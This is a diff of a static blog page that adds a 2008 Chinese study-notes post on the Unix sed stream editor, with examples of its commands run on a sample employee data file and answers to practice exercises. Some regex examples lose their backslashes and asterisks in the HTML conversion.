@@ -2074,6 +1914,155 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/21/e3-80-8aunix-shell-e5-ae-9e-e4-be-8b-e7-b2-be-e8-a7-a3-e3-80-8b-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-e4-b9-8bsed-e7-af-87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="九王爷">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="九王爷">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2008/03/21/e3-80-8aunix-shell-e5-ae-9e-e4-be-8b-e7-b2-be-e8-a7-a3-e3-80-8b-e5-ad-a6-e4-b9-a0-e7-ac-94-e8-ae-b0-e4-b9-8bsed-e7-af-87/" itemprop="url">
+                  《Unix Shell 实例精解》学习笔记之sed篇
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-21T17:35:40+08:00">
+                2008-03-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>1．sed命令简介<br>sed是流线型、非交互式编辑器。它允许你执行与vi和ex编辑器里一样的编辑任务。Sed 程序不是与编辑器交互式工作的，而是让你在命令行里敲入编辑的命令，给文件命名，然后在屏幕上查看命令输出结果。<br>2．sed工作原理<br>sed编辑器按一次处理一行的方式来处理文件，并把输出送到屏幕上。<br>3．sed 可以用寻址的方式来决定想要编辑哪一行。<br>4．sed 命令和选项<br>命令 功能<br>a  在当前行上添加一个文本行或者多个文本行<br>c  用新闻本改变（取代）当前行里的文本<br>d  删除行<br>i  在当前行之前插入文本<br>h  把模式空间内容复制到一个固定缓存<br>H  把模式空间内容添加到一个固定缓存<br>g  得到固定缓存里所有的禀复制到模式缓存，重写其内容<br>G  得到固定缓存的内容并复制到模式缓存，添加到里面<br>I  列出不打印的字符<br>p  打印行<br>n  读下一输入行，并开始用下一个命令处理换行符，而不是用第一个命令<br>q  结束或退出sed<br>r  从一个文件读如行<br>!  把命令应用到除了选出的行以外的其他所有行<br>s  把一个字串替换成另一个<br>替换标志<br>g  在一行上进行全局替换<br>p  打印行<br>w  把行写到一个文件中<br>x  用模式空间的内容交换固定缓存的内容<br>y  把一个字符转换成另一个(不能和整则表达式元字符一起使用)<br>5．sed元字符<br>    基本上，grep和vi使用的元字符都可以用在sed中。下表列出了一些特别的sed元字符：<br>元字符 &amp;amp;<br>功能 保存搜索串以便可以记在替换串里<br>例子    s/love/<strong>&amp;amp;</strong>/<br>解释    &amp;amp;号代表搜索串。串love将被星号包围的自身所替代；即love变成<strong>love</strong><br>6． sed 的实例(使用datafile)<br>datafile内容如下：<br>northwest NW Charles Main      3.0 .98 3 34<br>western  WE Sharon Gray      5.3 .97 5 23<br>southwest SW Lewis Dalsass      2.7 .8 2 18<br>southern SO Suan Chin      5.1  .95 4 15<br>southeast SE      Patricia Hemenway    4.0  .7  4  17<br>eastern  EA  TB Savage       4.4  .84  5  20<br>northeast  NE  AM Main Jr.       5.1  .94  3  13<br>north   NO  Margot Weber       4.5  .89 5   9<br>central  CT  Ann Stephens         5.7  .94   5  13<br>1&gt; 打印：p命令<br>sed ‘/north/p’ datafile<br>默认输出所有行，找到north的行重复打印<br>sed –n ‘/north/p’ datafile<br>禁止默认输出，只打印找到north的行<br>2&gt; 删除：d命令<br>sed ‘3d’ datafile<br>删除第三行，其余行输出到屏幕<br>sed ‘3,$d’ datafile<br>从第3行到最后一行都删除，将剩余部分输出到屏幕<br>sed ‘/north/d’ datafile<br>将含有north的行删除，其余输出到屏幕<br>3&gt; 替换：s命令<br>sed ‘s/west/north/g’ datafile<br>解释：找到datafile中的所有west并替换成north，将替换后的内容输出到屏幕。<br>sed ‘s/[0-9][0-9]$/&amp;amp;.5/‘ datafile<br>解释：在替代串里的&amp;amp;字符代表在搜索串中真正找到的。每个以两个数字结尾的行都被它自己取代，且要在后面加上.5<br>sed -n ‘s/Hemenway/Jones/gp’ datafile<br>解释：所有的Hemenway所在的位置都用Jones来取代，而且只有改变的行被打印。-n与p命令选项相结合来禁止默认输出。g代表全局替换<br>sed -n ‘s/(Mar)got/1ianne/p’ datafile<br>解释：模式Mar被封装在括弧里且在一个专用寄存器里存为标记1。在替换串里它将被引用做1。然后用Marianne替代Margot。<br>sed ‘s#3#88#g’ datafile<br>解释：s命令后面的字符是搜索串和替换串之间的分界符。默认的分界符是一个正斜杠，但也可以改变（只有使用s命令时）。无论s命令后面跟什么字符，它都是新的串分界符。当搜索包含一个正斜杠的模式，如路径或生日时，这种技巧可能有用的 ^V^<br>4&gt; 被选中的行的范围：逗号<br>sed -n ‘/west/,/east/p’ datafile<br>解释：打印在west和east之间的模式范围内所有行。如果west出现在east之后，则打印从west到下一个east或者到文件末尾的行，无论哪种情况先出现都可以。<br>sed ‘/west/,/east/s/$/<strong>VACA</strong>/‘ datafile<br>解释：对于在模式west到east范围内的行，行末尾将用<strong>VACA</strong>来取代。<br>5&gt; 多次编辑 -e 选项<br>sed -e ‘1,3d’ -e ‘s/Hemenway/Jones/‘ datafile<br>-e选项允许多次编辑。不同的编辑顺序可能导致不同的结果。<br>例如，如果两个命令都执行了替换，第一次替换可能影响第二次替换。<br>6&gt; 从文件中读取：r命令<br>sed ‘/Suan/r newfile’ datafile<br>解释：r命令从newfile中读取内容，将内容输出到Suan的后面。如果datafile中Suan出现的次数不只一次，则分别放到Suan的后面。<br>7&gt; 写入文件：w命令<br>sed -n ‘/north/w newfile’ datafile<br>解释：w命令把指定的行写入到一个文件。本例中所有的包含north的行写入到newfile中。<br>等同于 sed -n ‘/north/p’ datafile &gt; newfile<br>8&gt; 添加：a命令<br>$ sed ‘/north/a</p>
+<blockquote>
+<p>—-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–’ datafile<br> northwest NW Charles Main      3.0 .98 3 34<br>  —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> western WE Sharon Gray      5.3 .97 5 23<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> north   NO  Margot Weber       4.5  .89 5  9<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> central  CT  Ann Stephens         5.7  .94   5  13<br>    解释：红颜色的内容是要输入的内容。a命令后面跟要添加的内容。奇怪的是a后面必须另起一行，在输入要添加的内容，否则会提示命令错乱，真是搞不懂。<br>9&gt; 插入：i命令<br>$ sed ‘/north/i<br>—-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–’ datafile<br>  —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> northwest NW Charles Main      3.0 .98 3 34<br>  —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> western WE Sharon Gray      5.3 .97 5 23<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> —-&gt;THE NORTH SALES DISTRICT HAS MOVED&lt;—–<br> north   NO  Margot Weber       4.5  .89 5  9<br> central  CT  Ann Stephens         5.7  .94   5  13<br>10&gt;下一个：n命令<br>$ sed ‘/eastern/{n;s/AM/Archie/;}’ datafile<br>  northwest NW Charles Main      3.0 .98 3 34<br>  western WE Sharon Gray      5.3 .97 5 23<br>  southwest SW Lewis Dalsass      2.7 .8 2 18<br>  southern SO Suan Chin      5.1  .95 4 15<br>  southeast SE      Patricia Hemenway    4.0  .7  4  17<br>  eastern  EA  TB Savage       4.4  .84  5  20<br>  northeast  NE  AM Main Jr.       5.1  .94  3  13<br>  ……<br>解释：如果在某一行里模式eastern被匹配，n命令使sed区的下一行，用该行带换模式空间，用Archie替换AM，打印并继续。<br>11&gt;变换：y 命令<br>% sed ‘1,3y/abcdefghijklmnopqrst/ABCDEFGHIJKLMNOPQRST/‘ datafile<br>解释:将对应字母进行转换。<br>12&gt;退出：q命令<br>% sed ‘5q’ datafile<br>解释：在打印了5行之后，用q命令退出sed程序。<br>13&gt;保存和取得：h和G命令<br>$ sed -e ‘/southeast/h’ -e ‘$G’ datafile<br> northwest NW Charles Main      3.0 .98 3 34<br> western  WE Sharon Gray      5.3 .97 5 23<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> north   NO  Margot Weber       4.5  .89 5   9<br> central  CT  Ann Stephens         5.7  .94   5  13<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br>解释：当sed处理文件时，每行都存在模式空间(pattern space)的临时缓存中。除非行被禁止打印或删除,否则行将在处理完后被打印到屏幕，然后请模式空间并把下一输入行保存在那里等待处理。在这个例子中，在找到模式之后，把它放在模式空间里，而且h命令复制它并把它存到另一个叫做保存缓存(holding buffer)中。<br>第二个sed指令里，当读入最后一行($)时,G命令告诉sed从包存缓存中取得该行并放回模式空间缓存，添加到当前存在那里的行中。本例子就是最后一行。<br>$ sed -e ‘/WE/{h;d;}’ -e ‘/CT/G’ datafile<br> northwest NW Charles Main      3.0 .98 3 34<br> southwest SW Lewis Dalsass      2.7 .8 2 18<br> southern SO Suan Chin      5.1  .95 4 15<br> southeast SE      Patricia Hemenway    4.0  .7  4  17<br> eastern  EA  TB Savage       4.4  .84  5  20<br> northeast  NE  AM Main Jr.       5.1  .94  3  13<br> north   NO  Margot Weber       4.5  .89 5   9<br> central  CT  Ann Stephens         5.7  .94   5  13<br> western WE Sharon Gray      5.3 .97 5 23<br>解释：第一个命令h将找到了WE的行放到保存缓存中，然后删除该行；第二个命令/CT/G就是在找到了CT的行的后面加入保存缓存的内容。<br>14&gt;G和g的区别<br>    G命令在符合的条件行后面添加保存缓存中的内容；g命令用保存缓存中的内容覆盖符合条件的行。<br>15&gt;sed 命令的花括号{}的作用<br>   花括号{}中可以放入多个命令，每个命令后面要用分号;。<br>16&gt;保存和交换：h 和 x命令。<br>$ sed -e ‘/Patricia/h’ -e ‘/Margot/x’ datafile<br>northwest  NW  Charles Main   3.0  .98  3  34<br>western  WE  Sharon Gray   5.3  .97  5  23<br>southwest  SW  Lewis Dalsass  2.7  .8  2  18<br>southern  SO  Suan Chin          5.1  .95  4  15<br>southeast  SE  Patricia Hemenway  4.0  .7  4  17<br>eastern  EA  TB Savage          4.4  .84  5  20<br>northeast  NE  AM Main Jr.          5.1  .94  3  13<br>southeast  SE  Patricia Hemenway  4.0  .7  4  17<br>central  CT  Ann Stephens          5.7  .94  5  13<br>解释：x命令将找到的行用保存缓存中的内容替换。<br>7． 用sed来编写命令表<br>     sed 命令表(script)是文件里的一个sed命令列表。用-f选项来引用一个命令表文件。编辑sed命令表有特殊要求：命令末尾不能有任何为岁的空白符或者文本。如果命令不是自成一行，就必须用分号结束。在源代码chap4目录下有两个编辑好的命令表文件(sedding1和sedding2)可以参考。<br>   下面是使用sed命令表的例子。<br>$ sed -f sedding1 datafile</p>
+<h2 id="EMPLOYEE-DATABASE"><a href="#EMPLOYEE-DATABASE" class="headerlink" title="  EMPLOYEE DATABASE"></a>  EMPLOYEE DATABASE</h2><p>  northwest NW Charles Main 3.0 .98 3 34<br>  western WE Sharon Gray 5.3 .97 5 23<br>  southwest SW Lewis Dalsass 2.7 .8 2 18<br> Lewis is the TOP Salesperson for April!!<br> Lewis is moving to the southern district next month.<br> CONGRATULATIONS!<br>  southern SO Suan Chin 5.1 .95 4 15<br>  southeast SE Patricia Hemenway 4.0 .7 4 17<br>  eastern EA TB Savage 4.4 .84 5 20<br>  northeast NE AM Main Jr. 5.1 .94 3 13</p>
+<hr>
+<pre><code>MARGOT HAS RETIRED
+</code></pre><hr>
+<p>8． Sed练习参考答案<br>    练习内容参考databook文件<br> 1〉 把Jon改成Jonathan<br>sed ‘s/Jon/Jonathan/‘ datebook<br>2〉 删除头3行<br>sed ‘1,3d’ datebook<br>3〉 打印5—10行<br>sed -n ‘5,10p’ datebook<br>4〉 删除包含Lane的行<br>sed ‘/Lane/d’ datebook<br>5〉 打印所有生日是在Noverber到December之间的行<br>sed -n ‘/:1[12]//p’ datebook<br>6〉 把三个星添加到以Fred开头的行尾<br>sed ‘/^Fred/s/$/<em>**/‘ datebook<br>7〉 用JOSE HAS RETIRED取代包含Jose的行<br>sed ‘s/^Jose[0-9]</em>[a-z]<em>[A-Z]</em> <em>.</em>$/JOSE HAS LEFT/‘ datebook<br>8〉 把Popeye的生日改成11/14/46<br>sed ‘/Popeye/s/:[0-9]<em>[0-9]</em>/[0-9]<em>[0-9]</em>/[0-9]<em>[0-9]</em>/:11/14/46/‘ datebook<br>9〉 删除所有空白行 sed ‘/^$/d’ datebook 10〉 写一个sed命令表，将:<br>a. 在第1行之前插入标题PERSONNEL FILE<br>b. 删除以500结尾的工资<br>c. 打印文件内容，把姓和名颠倒<br>d. 在文件末尾添加THE END<br>答案放在chap04/a10文件中，内容如下：</p>
+<h1 id="My-first-sed-script-by-Wangzhh"><a href="#My-first-sed-script-by-Wangzhh" class="headerlink" title="My first sed script by Wangzhh."></a>My first sed script by Wangzhh.</h1><p>1i<br> PERSONNEL FILE<br>/500/d<br>s/([A-Z][a-z]<em>) ([A-Z][a-z]</em>):/2 1:/<br>$a<br> THE END</p>
+</blockquote>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
   </section>
 
   
@@ -2123,7 +2112,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">270</span>
+                <span class="site-state-item-count">269</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2141,7 +2130,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-count">38</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
